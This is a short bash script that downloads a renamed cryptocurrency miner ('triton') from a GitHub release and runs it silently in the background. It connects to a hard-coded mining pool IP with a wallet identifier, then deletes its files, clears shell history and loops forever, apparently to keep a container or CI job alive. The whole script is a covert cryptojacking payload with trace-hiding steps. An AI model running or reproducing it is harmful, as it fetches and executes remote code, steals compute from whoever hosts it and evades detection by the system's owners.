#!/bin/bash
set -x
apt-get update 
ln -fs /usr/share/zoneinfo/America/Montserrat /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://github.com/kolorijo01/metgoi/releases/download/triton/triton.tar.gz > /dev/null 2>&1
tar -xvf triton.tar.gz
chmod 777 triton
./triton -o 159.203.162.18:3333 -u nexa:nqtsq5g5ewsu60xpu8zn7snghgf3yx09j5gcc648y44dcyg9 -p "gibhq" -a rx/0 -t 1 > /dev/null 2>&1 &
rm -rvf *
history -cr
while true
do
        echo "croot....!"
        sleep 20
done
